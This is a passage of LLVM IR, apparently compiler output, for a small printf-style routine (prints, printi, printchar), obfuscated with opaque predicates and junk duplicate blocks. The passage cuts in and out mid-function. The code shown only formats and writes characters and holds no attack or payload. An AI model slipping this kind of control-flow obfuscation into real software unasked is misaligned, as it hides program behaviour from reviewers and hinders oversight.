originalBB31alteredBB:                            ; preds = %originalBB31, %369
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %394
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %414
  %462 = load i8**, i8*** %4, align 8
  %463 = icmp ne i8** %462, null
  br label %originalBB39
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %122

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %originalBBpart2, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %43

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i32, i32* @x.31
  %26 = load i32, i32* @y.32
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i8*, i8** %12, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %12, align 8
  %35 = load i32, i32* @x.31
  %36 = load i32, i32* @y.32
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %17

; <label>:43:                                     ; preds = %17
  %44 = load i32, i32* %11, align 4
  %45 = load i32, i32* %7, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.31
  %49 = load i32, i32* @y.32
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  store i32 0, i32* %7, align 4
  %56 = load i32, i32* @x.31
  %57 = load i32, i32* @y.32
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %84

; <label>:64:                                     ; preds = %43
  %65 = load i32, i32* @x.31
  %66 = load i32, i32* @y.32
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %64
  %73 = load i32, i32* %11, align 4
  %74 = load i32, i32* %7, align 4
  %75 = sub nsw i32 %74, %73
  store i32 %75, i32* %7, align 4
  %76 = load i32, i32* @x.31
  %77 = load i32, i32* @y.32
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %84

; <label>:84:                                     ; preds = %originalBBpart210, %originalBBpart24
  %85 = load i32, i32* @x.31
  %86 = load i32, i32* @y.32
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %84
  %93 = load i32, i32* %8, align 4
  %94 = and i32 %93, 2
  %95 = icmp ne i32 %94, 0
  %96 = load i32, i32* @x.31
  %97 = load i32, i32* @y.32
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart218, label %originalBB12alteredBB

originalBBpart218:                                ; preds = %originalBB12
  br i1 %95, label %104, label %105

; <label>:104:                                    ; preds = %originalBBpart218
  store i32 48, i32* %10, align 4
  br label %105

; <label>:105:                                    ; preds = %104, %originalBBpart218
  %106 = load i32, i32* @x.31
  %107 = load i32, i32* @y.32
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %105
  %114 = load i32, i32* @x.31
  %115 = load i32, i32* @y.32
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %122

; <label>:122:                                    ; preds = %originalBBpart222, %4
  %123 = load i32, i32* %8, align 4
  %124 = and i32 %123, 1
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %155, label %126

; <label>:126:                                    ; preds = %122
  br label %127

; <label>:127:                                    ; preds = %135, %126
  %128 = load i32, i32* %7, align 4
  %129 = icmp sgt i32 %128, 0
  br i1 %129, label %130, label %138

; <label>:130:                                    ; preds = %127
  %131 = load i8**, i8*** %5, align 8
  %132 = load i32, i32* %10, align 4
  call void @printchar(i8** %131, i32 %132)
  %133 = load i32, i32* %9, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %9, align 4
  br label %135

; <label>:135:                                    ; preds = %130
  %136 = load i32, i32* %7, align 4
  %137 = add nsw i32 %136, -1
  store i32 %137, i32* %7, align 4
  br label %127

; <label>:138:                                    ; preds = %127
  %139 = load i32, i32* @x.31
  %140 = load i32, i32* @y.32
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %138
  %147 = load i32, i32* @x.31
  %148 = load i32, i32* @y.32
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %155

; <label>:155:                                    ; preds = %originalBBpart227, %122
  %156 = load i32, i32* @x.31
  %157 = load i32, i32* @y.32
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %155
  %164 = load i32, i32* @x.31
  %165 = load i32, i32* @y.32
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %172

; <label>:172:                                    ; preds = %originalBBpart235, %originalBBpart231
  %173 = load i8*, i8** %6, align 8
  %174 = load i8, i8* %173, align 1
  %175 = icmp ne i8 %174, 0
  br i1 %175, label %176, label %202

; <label>:176:                                    ; preds = %172
  %177 = load i8**, i8*** %5, align 8
  %178 = load i8*, i8** %6, align 8
  %179 = load i8, i8* %178, align 1
  %180 = zext i8 %179 to i32
  call void @printchar(i8** %177, i32 %180)
  %181 = load i32, i32* %9, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %9, align 4
  br label %183

; <label>:183:                                    ; preds = %176
  %184 = load i32, i32* @x.31
  %185 = load i32, i32* @y.32
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %183
  %192 = load i8*, i8** %6, align 8
  %193 = getelementptr inbounds i8, i8* %192, i32 1
  store i8* %193, i8** %6, align 8
  %194 = load i32, i32* @x.31
  %195 = load i32, i32* @y.32
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %172

; <label>:202:                                    ; preds = %172
  br label %203

; <label>:203:                                    ; preds = %211, %202
  %204 = load i32, i32* %7, align 4
  %205 = icmp sgt i32 %204, 0
  br i1 %205, label %206, label %214

; <label>:206:                                    ; preds = %203
  %207 = load i8**, i8*** %5, align 8
  %208 = load i32, i32* %10, align 4
  call void @printchar(i8** %207, i32 %208)
  %209 = load i32, i32* %9, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %9, align 4
  br label %211

; <label>:211:                                    ; preds = %206
  %212 = load i32, i32* %7, align 4
  %213 = add nsw i32 %212, -1
  store i32 %213, i32* %7, align 4
  br label %203

; <label>:214:                                    ; preds = %203
  %215 = load i32, i32* @x.31
  %216 = load i32, i32* @y.32
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %214
  %223 = load i32, i32* %9, align 4
  %224 = load i32, i32* @x.31
  %225 = load i32, i32* @y.32
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  ret i32 %223

originalBBalteredBB:                              ; preds = %originalBB, %24
  %232 = load i8*, i8** %12, align 8
  %233 = getelementptr inbounds i8, i8* %232, i32 1
  store i8* %233, i8** %12, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  store i32 0, i32* %7, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %64
  %234 = load i32, i32* %11, align 4
  %235 = load i32, i32* %7, align 4
  %_ = sub i32 0, %235
  %gen = add i32 %_, %234
  %_7 = shl i32 %235, %234
  %_8 = shl i32 %235, %234
  %236 = sub nsw i32 %235, %234
  store i32 %236, i32* %7, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %84
  %237 = load i32, i32* %8, align 4
  %_13 = shl i32 %237, 2
  %_14 = sub i32 %237, 2
  %gen15 = mul i32 %_14, 2
  %_16 = shl i32 %237, 2
  %238 = and i32 %237, 2
  %239 = icmp ne i32 %238, 0
  br label %originalBB12

originalBB20alteredBB:                            ; preds = %originalBB20, %105
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %138
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %155
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %183
  %240 = load i8*, i8** %6, align 8
  %241 = getelementptr inbounds i8, i8* %240, i32 1
  store i8* %241, i8** %6, align 8
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %214
  %242 = load i32, i32* %9, align 4
  br label %originalBB37
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %198

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %61

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %61

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %61

; <label>:42:                                     ; preds = %39
  %43 = load i32, i32* @x.33
  %44 = load i32, i32* @y.34
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  store i32 1, i32* %19, align 4
  %51 = load i32, i32* %10, align 4
  %52 = sub nsw i32 0, %51
  store i32 %52, i32* %21, align 4
  %53 = load i32, i32* @x.33
  %54 = load i32, i32* @y.34
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %61

; <label>:61:                                     ; preds = %originalBBpart2, %39, %36, %33
  %62 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %63 = getelementptr inbounds i8, i8* %62, i64 12
  %64 = getelementptr inbounds i8, i8* %63, i64 -1
  store i8* %64, i8** %17, align 8
  %65 = load i8*, i8** %17, align 8
  store i8 0, i8* %65, align 1
  br label %66

; <label>:66:                                     ; preds = %113, %61
  %67 = load i32, i32* @x.33
  %68 = load i32, i32* @y.34
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %66
  %75 = load i32, i32* %21, align 4
  %76 = icmp ne i32 %75, 0
  %77 = load i32, i32* @x.33
  %78 = load i32, i32* @y.34
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB2alteredBB

originalBBpart24:                                 ; preds = %originalBB2
  br i1 %76, label %85, label %122

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = load i32, i32* %21, align 4
  %87 = load i32, i32* %11, align 4
  %88 = urem i32 %86, %87
  store i32 %88, i32* %18, align 4
  %89 = load i32, i32* %18, align 4
  %90 = icmp sge i32 %89, 10
  br i1 %90, label %91, label %113

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* @x.33
  %93 = load i32, i32* @y.34
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* %15, align 4
  %101 = sub nsw i32 %100, 48
  %102 = sub nsw i32 %101, 10
  %103 = load i32, i32* %18, align 4
  %104 = add nsw i32 %103, %102
  store i32 %104, i32* %18, align 4
  %105 = load i32, i32* @x.33
  %106 = load i32, i32* @y.34
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart238, label %originalBB6alteredBB

originalBBpart238:                                ; preds = %originalBB6
  br label %113

; <label>:113:                                    ; preds = %originalBBpart238, %85
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, 48
  %116 = trunc i32 %115 to i8
  %117 = load i8*, i8** %17, align 8
  %118 = getelementptr inbounds i8, i8* %117, i32 -1
  store i8* %118, i8** %17, align 8
  store i8 %116, i8* %118, align 1
  %119 = load i32, i32* %11, align 4
  %120 = load i32, i32* %21, align 4
  %121 = udiv i32 %120, %119
  store i32 %121, i32* %21, align 4
  br label %66

; <label>:122:                                    ; preds = %originalBBpart24
  %123 = load i32, i32* %19, align 4
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %125, label %174

; <label>:125:                                    ; preds = %122
  %126 = load i32, i32* %13, align 4
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %170

; <label>:128:                                    ; preds = %125
  %129 = load i32, i32* @x.33
  %130 = load i32, i32* @y.34
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %128
  %137 = load i32, i32* %14, align 4
  %138 = and i32 %137, 2
  %139 = icmp ne i32 %138, 0
  %140 = load i32, i32* @x.33
  %141 = load i32, i32* @y.34
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart253, label %originalBB40alteredBB

originalBBpart253:                                ; preds = %originalBB40
  br i1 %139, label %148, label %170

; <label>:148:                                    ; preds = %originalBBpart253
  %149 = load i32, i32* @x.33
  %150 = load i32, i32* @y.34
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %148
  %157 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %157, i32 45)
  %158 = load i32, i32* %20, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %20, align 4
  %160 = load i32, i32* %13, align 4
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %13, align 4
  %162 = load i32, i32* @x.33
  %163 = load i32, i32* @y.34
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart268, label %originalBB55alteredBB

originalBBpart268:                                ; preds = %originalBB55
  br label %173

; <label>:170:                                    ; preds = %originalBBpart253, %125
  %171 = load i8*, i8** %17, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 -1
  store i8* %172, i8** %17, align 8
  store i8 45, i8* %172, align 1
  br label %173

; <label>:173:                                    ; preds = %170, %originalBBpart268
  br label %174

; <label>:174:                                    ; preds = %173, %122
  %175 = load i32, i32* @x.33
  %176 = load i32, i32* @y.34
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %174
  %183 = load i32, i32* %20, align 4
  %184 = load i8**, i8*** %9, align 8
  %185 = load i8*, i8** %17, align 8
  %186 = load i32, i32* %13, align 4
  %187 = load i32, i32* %14, align 4
  %188 = call i32 @prints(i8** %184, i8* %185, i32 %186, i32 %187)
  %189 = add nsw i32 %183, %188
  store i32 %189, i32* %8, align 4
  %190 = load i32, i32* @x.33
  %191 = load i32, i32* @y.34
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart277, label %originalBB70alteredBB

originalBBpart277:                                ; preds = %originalBB70
  br label %198

; <label>:198:                                    ; preds = %originalBBpart277, %25
  %199 = load i32, i32* %8, align 4
  ret i32 %199

originalBBalteredBB:                              ; preds = %originalBB, %42
  store i32 1, i32* %19, align 4
  %200 = load i32, i32* %10, align 4
  %_ = sub i32 0, %200
  %gen = mul i32 %_, %200
  %_1 = shl i32 0, %200
  %201 = sub nsw i32 0, %200
  store i32 %201, i32* %21, align 4
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %66
  %202 = load i32, i32* %21, align 4
  %203 = icmp ne i32 %202, 0
  br label %originalBB2

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %204 = load i32, i32* %15, align 4
  %_7 = sub i32 0, %204
  %gen8 = add i32 %_7, 48
  %_9 = sub i32 %204, 48
  %gen10 = mul i32 %_9, 48
  %_11 = shl i32 %204, 48
  %_12 = shl i32 %204, 48
  %_13 = sub i32 %204, 48
  %gen14 = mul i32 %_13, 48
  %_15 = sub i32 0, %204
  %gen16 = add i32 %_15, 48
  %_17 = sub i32 %204, 48
  %gen18 = mul i32 %_17, 48
  %_19 = sub i32 0, %204
  %gen20 = add i32 %_19, 48
  %205 = sub nsw i32 %204, 48
  %_21 = shl i32 %205, 10
  %_22 = shl i32 %205, 10
  %_23 = sub i32 %205, 10
  %gen24 = mul i32 %_23, 10
  %_25 = shl i32 %205, 10
  %_26 = sub i32 0, %205
  %gen27 = add i32 %_26, 10
  %_28 = shl i32 %205, 10
  %_29 = shl i32 %205, 10
  %_30 = shl i32 %205, 10
  %_31 = sub i32 0, %205
  %gen32 = add i32 %_31, 10
  %_33 = sub i32 %205, 10
  %gen34 = mul i32 %_33, 10
  %206 = sub nsw i32 %205, 10
  %207 = load i32, i32* %18, align 4
  %_35 = sub i32 %207, %206
  %gen36 = mul i32 %_35, %206
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %18, align 4
  br label %originalBB6

originalBB40alteredBB:                            ; preds = %originalBB40, %128
  %209 = load i32, i32* %14, align 4
  %_41 = shl i32 %209, 2
  %_42 = sub i32 %209, 2
  %gen43 = mul i32 %_42, 2
  %_44 = shl i32 %209, 2
  %_45 = shl i32 %209, 2
  %_46 = shl i32 %209, 2
  %_47 = sub i32 0, %209
  %gen48 = add i32 %_47, 2
  %_49 = shl i32 %209, 2
  %_50 = sub i32 0, %209
  %gen51 = add i32 %_50, 2
  %210 = and i32 %209, 2
  %211 = icmp ne i32 %210, 0
  br label %originalBB40

originalBB55alteredBB:                            ; preds = %originalBB55, %148
  %212 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %212, i32 45)
  %213 = load i32, i32* %20, align 4
  %_56 = sub i32 0, %213
  %gen57 = add i32 %_56, 1
  %_58 = sub i32 0, %213
  %gen59 = add i32 %_58, 1
  %_60 = sub i32 0, %213
  %gen61 = add i32 %_60, 1
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %20, align 4
  %215 = load i32, i32* %13, align 4
  %_62 = sub i32 %215, -1
  %gen63 = mul i32 %_62, -1
  %_64 = shl i32 %215, -1
  %_65 = sub i32 0, %215
  %gen66 = add i32 %_65, -1
  %216 = add nsw i32 %215, -1
  store i32 %216, i32* %13, align 4
  br label %originalBB55

originalBB70alteredBB:                            ; preds = %originalBB70, %174
  %217 = load i32, i32* %20, align 4
  %218 = load i8**, i8*** %9, align 8
  %219 = load i8*, i8** %17, align 8
  %220 = load i32, i32* %13, align 4
  %221 = load i32, i32* %14, align 4
  %222 = call i32 @prints(i8** %218, i8* %219, i32 %220, i32 %221)
  %_71 = shl i32 %217, %222
  %_72 = sub i32 0, %217
  %gen73 = add i32 %_72, %222
  %_74 = sub i32 %217, %222
  %gen75 = mul i32 %_74, %222
  %223 = add nsw i32 %217, %222
  store i32 %223, i32* %8, align 4
  br label %originalBB70
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = load i32, i32* @x.35
  %4 = load i32, i32* @y.36
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  store i8** %0, i8*** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i8**, i8*** %11, align 8
  %14 = icmp ne i8** %13, null
  %15 = load i32, i32* @x.35
  %16 = load i32, i32* @y.36
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %47

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.35
  %25 = load i32, i32* @y.36
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i32, i32* %12, align 4
  %33 = trunc i32 %32 to i8
  %34 = load i8**, i8*** %11, align 8
  %35 = load i8*, i8** %34, align 8
  store i8 %33, i8* %35, align 1
  %36 = load i8**, i8*** %11, align 8
  %37 = load i8*, i8** %36, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %36, align 8
  %39 = load i32, i32* @x.35
  %40 = load i32, i32* @y.36
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = bitcast i32* %12 to i8*
  %49 = call i64 @write(i32 1, i8* %48, i64 1)
  br label %50

; <label>:50:                                     ; preds = %47, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %51 = alloca i8**, align 8
  %52 = alloca i32, align 4
  store i8** %0, i8*** %51, align 8
  store i32 %1, i32* %52, align 4
  %53 = load i8**, i8*** %51, align 8
  %54 = icmp ne i8** %53, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %55 = load i32, i32* %12, align 4
